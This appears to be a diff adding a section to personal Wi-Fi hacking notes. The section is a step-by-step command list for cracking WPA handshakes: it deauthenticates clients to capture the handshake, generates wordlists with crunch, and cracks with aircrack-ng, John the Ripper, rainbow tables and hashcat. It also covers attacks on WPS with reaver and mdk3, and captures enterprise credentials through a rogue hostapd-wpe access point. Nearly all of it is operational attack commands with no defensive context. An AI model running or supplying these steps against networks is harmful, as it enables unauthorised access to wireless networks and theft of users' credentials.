@@ -225,6 +225,111 @@ Desktop Downloads Pictures ...
 
 > aircrack-ng [output_file].cap
 
+"There has also other attacks for WEP such as chopchop, fragmentation."
+
+WPA Cracking
+------------
+
+1) Capture Hand Shake (aireplay-ng)
+2) Create Word List
+
+"After typing below command, you will see connected devices in targeted network."
+
+> airodump-ng --bssid [target_network_mac_address] --channel [channel_id] --write [output_file] mon0
+
+> aireplay-ng --deauth 4 -a [target_network_mac_address] -c [target_network_client_mac_address] mon0
+
+"After typing above command it will get hand shake in above it command."
+
+"Lets create word list"
+
+> crunch [min] [max] [characters] -t [pattern] -o [word_list_file]
+
+e.g - crunch 6 8 [abc123] -t a@@@@b
+
+aaaaab
+aabbbb
+abaaab
+.
+.
+.
+
+> aircrack-ng [output_file].cap -w [word_list_file]
+
+John The Ripper
+
+"Saving Progress by using John The Ripper"
+
+> john --wordlist=[word_list_file] --stdout
+
+> john --wordlist=[word_list_file] --stdout --session=[session_name] | aircrack-ng -w - -b [temp_mac_address] [output_file].cap
+
+> john --restore=[session_name] | aircrack-ng -w - -b [temp_mac_address] [output_file].cap
+
+"Making not to waste storage for huge word list"
+
+> crunch 8 8 -o [word_list_file]
+
+> crunch 8 8 
+
+> crunch 8 8 | aircrack-ng -b [temp_mac_address] -w - [output_file].cap
+
+> crunch 8 8 | john --stdin --session=[session_name] --stdout | aircrack-ng -b [temp_mac_address] -w - [output_file].cap
+
+> crunch 8 8 | john --restore=[session_name] | aircrack-ng -b [temp_mac_address] -w - [output_file].cap
+
+Rainbow Table
+
+"Speed up cracking process"
+
+> airolib-ng [db_name] --import passwd [word_list_file]
+> echo "target_network_name" > [target_essid_file]
+> airolib-ng [db_name] --import essid [target_essid_file]
+> airolib-ng [db_name] --batch
+
+> aircrack-ng -r [db_name] [output_file].cap
+
+CPU VS GPU
+
+"Using GPU for cracking (e.g - hashcat)"
+
+> hashcat64.exe -m 2500 -d 1 [output_file].hccapx [word_list_file].txt
+
+WPA Explotation
+---------------
+
+"Lets explore WPS enabled network"
+
+> wash --interface mon0
+
+> aireplay-ng --fakeauth 30 -a [target_network_mac_address] -h [temp_mac_address] mon0
+
+> reaver --bssid [target_network_mac_address] --channel [channel_id] --interface mon0 -vvv --no-associate
+
+"Lets unlock WPS"
+
+> mdk3 mon0 a -a [target_network_mac_address] -m
+
+Enterprise WPA Cracking
+---------------------
+
+"By using Fake Enterprise WPA Access Point"
+
+> apt-get update
+> apt-get install hostapd-wpe
+> leafpad /etc/hostapd-wpe/hostapd-wpe.conf
+
+"Modify hostapd-wpe.conf file as necessary."
+
+> service network-manager stop
+> hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
+
+> asleap -C [challenge] -R [response] -W [word_list_file]
+
+
+
+
+
 
 
 
